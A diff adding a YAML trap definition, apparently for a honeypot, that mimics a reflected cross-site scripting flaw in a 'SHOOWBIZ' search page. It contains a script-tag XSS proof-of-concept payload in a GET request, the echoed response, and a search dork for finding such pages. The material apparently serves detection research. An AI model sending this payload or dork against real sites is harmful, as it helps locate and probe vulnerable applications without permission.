@@ -1,0 +1,27 @@
+id: shoowbiz-xss
+info:
+  name: SHOOWBIZ - Cross Site Scripting
+  author: r3Y3r53
+  description: 'Cross-Site Scripting, is a type of security vulnerability commonly
+    found in web applications. It occurs when an attacker injects malicious scripts
+    (typically written in JavaScript) into web pages viewed by other users.
+
+    '
+  severity: medium
+  reference:
+  - https://www.exploitalert.com/view-details.html?id=36000
+  metadata:
+    verified: true
+    max-request: 1
+    google-drok: inurl:"search.php?q="
+  tags: shoowbiz,xss
+traps:
+- request:
+    method: GET
+    path: /search.php?q=%3CScRipT%3Ealert(document.domain);%3C/ScRipT%3E
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: <ScRipT>alert(document.domain);</ScRipT>Search result in
